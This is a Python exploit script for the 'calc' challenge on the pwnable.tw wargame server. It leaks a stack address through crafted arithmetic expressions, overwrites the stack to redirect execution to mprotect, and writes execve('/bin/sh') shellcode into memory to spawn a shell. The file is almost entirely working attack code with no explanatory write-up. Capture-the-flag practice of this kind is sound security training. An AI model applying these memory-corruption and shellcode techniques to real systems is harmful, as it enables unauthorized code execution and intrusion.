# coding: utf-8

import socket
import struct
import time
import binascii

host = 'chall.pwnable.tw'
port = 10100
command1 = '00-6\n'  # get address of numbers-struct (after parse_expr)
command2 = '00+600+1400771632\n'
command3 = '00+599+1854530384\n'
command4 = '00+598+1747935849\n'
command5 = '00+597+796092416\n'
command6 = '00+596+835866728\n'
command7 = '00+595+12736\n'
command8 = '00+601+773504\n'


def int_to_uint(val):
    return struct.unpack('<I', struct.pack('<i', val))[0]

def uint_to_int(val):
    return struct.unpack('<i', struct.pack('<I', val))[0]


def send_command_and_print(s, cmd):
    s.send(cmd)
    time.sleep(0.2)
    r = s.recv(1000)
    print r
    return r


def dummy():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    time.sleep(0.5)
    r = s.recv(1000)
    print r
    stackaddr = send_command_and_print(s, command1)
    const_value = 337223
    val2 = const_value - (int(stackaddr) + 600 * 4)
    offset = 0x16A
    command9 = '00+' + str(offset) + '+' + str(const_value) + '\n'
    command10 = '00+' + str(offset + 1) + '-' + str(val2) + '\n'
    command11 = '\n'
    # print command9
    send_command_and_print(s, command2)
    send_command_and_print(s, command3)
    send_command_and_print(s, command4)
    send_command_and_print(s, command5)
    send_command_and_print(s, command6)
    send_command_and_print(s, command7)
    send_command_and_print(s, command8)
    send_command_and_print(s, command9)
    send_command_and_print(s, command10)
    send_command_and_print(s, command11)


def put_value(offset, prev, target):
    if target < prev:
        next_val = prev - target
        return '00+{}-{}'.format(offset, prev - target), next_val
    elif target > prev:
        next_val = target - prev
        return '00+{}+{}'.format(offset, target - prev), next_val
    else:
        assert True, 'Target == Prev'


return_from_calc = 0x8049499
mprotect = 0x806F1F0
offset = 361
stack_addr = -13524
print 'Stack address, ', hex(int_to_uint(stack_addr))
shell_addr = int_to_uint(stack_addr) + 1060
print 'Shell address, ', hex(shell_addr)
MEM_ATTR = 7
commands = []
command, prev = put_value(offset=offset, prev=return_from_calc, target=mprotect)
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=uint_to_int(shell_addr))
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=uint_to_int(int_to_uint(stack_addr) & 0xfffff000))
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=0x1000)
commands.append(command)
offset += 1
command, prev = put_value(offset=offset, prev=prev, target=MEM_ATTR)
commands.append(command)
offset += 1
print commands

shellcode = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x87\xe3\xb0\x0b\xcd\x80'
while len(shellcode) % 4 != 0:
    shellcode += '\x00'
shellcode = struct.unpack('<' + 'I' * (len(shellcode) / 4), shellcode)
shell = []
# offset = 600
# prev = 0
for i, code in enumerate(shellcode):
    command, prev = put_value(offset=offset + i, prev=prev, target=code)
    shell.append(command)
print 'Shellcode: ', shell

all_commands = commands + shell
open('commands.txt', 'w').write(command1+'\n'.join(all_commands) + '\n'*3)